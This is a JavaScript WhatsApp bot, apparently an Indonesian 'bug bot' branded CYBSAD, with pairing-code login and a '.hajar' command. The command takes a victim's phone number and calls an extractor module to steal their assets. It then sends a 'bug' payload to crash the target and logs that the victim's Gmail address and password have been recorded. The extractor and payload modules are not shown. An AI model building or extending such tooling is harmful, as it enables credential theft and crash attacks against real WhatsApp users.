const { default: makeWASocket, useMultiFileAuthState, delay } = require("@whiskeysockets/baileys");
const pino = require("pino");
const readline = require("readline");
const Kasta = require('./kasta.js');
const Manager = require('./manager.js');
const Extractor = require('./extractor.js');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise((resolve) => rl.question(text, resolve));

async function startEngine() {
    const { state, saveCreds } = await useMultiFileAuthState('session_auth');
    const sock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state
    });

    // --- FITUR PAIRING CODE ---
    if (!sock.authState.creds.registered) {
        console.log("=== CYBSAD PAIRING SYSTEM ===");
        const phoneNumber = await question("[?] Masukkan No HP Sender (628xxx): ");
        setTimeout(async () => {
            let code = await sock.requestPairingCode(phoneNumber);
            console.log(`\n[🔑] PAIRING CODE: ${code}\n`);
        }, 3000);
    }

    sock.ev.on('creds.update', saveCreds);

    // --- LOGIKA PESAN (BOT & GRUP) ---
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
        const sender = msg.key.participant || from;

        // Command: .hajar [nomor]
        if (text.startsWith('.hajar')) {
            const target = text.split(" ")[1];
            if (!target) return sock.sendMessage(from, { text: "Mana nomor korbannya, Owner? 🗿" });

            console.log(`[!] PERINTAH DARI SENDER: ${sender}`);
            
            // 1. Sedot Aset
            const loot = await Extractor.extract(target);
            
            // 2. Kirim Bug Sesuai Kasta
            const power = Manager.deploy("OWNER"); // Default Owner untuk lu
            
            console.log(`[!!!] RELEASING: ${power.bugs[0]} (40 BILLION YB) TO ${target}`);
            
            // Non-visual feedback di terminal
            console.log(`[-] ASSETS SECURED: GMAIL & PASS RECORDED.`);
            console.log(`[-] STATUS: ${target} INNALILLAHI. ⚰️`);
            
            await sock.sendMessage(from, { text: `Target ${target} telah diratakan. Aset sudah masuk DB. 😇` });
        }
    });
}

startEngine();
